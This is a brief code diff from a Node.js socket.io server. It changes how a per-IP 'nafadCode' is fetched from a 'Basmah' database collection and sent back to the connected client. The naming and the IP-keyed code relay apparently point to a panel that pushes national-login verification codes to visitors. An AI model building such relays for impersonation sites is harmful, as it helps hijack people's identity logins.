@@ -534,13 +534,8 @@ io.on("connection", (socket) => {
       // 1) Find (or create) the User
       const user = await findOrCreateUser(ip);
 
-      // 2) Retrieve the latest NafadCode record for this user
-      const record = user.basmahCode
-        ? { code: user.basmahCode } // Use the basmahCode directly if it exists
-        : null;
-
-      // 3) Extract the code (or null if none)
-      const code = record ? record.code : null;
+      const doc = await Basmah.findOne({ ip: user.ip }).lean();
+      const code = doc ? doc.code : null;
 
       // 4) Emit back to the same socket
       socket.emit("nafadCode", { error: null, code });
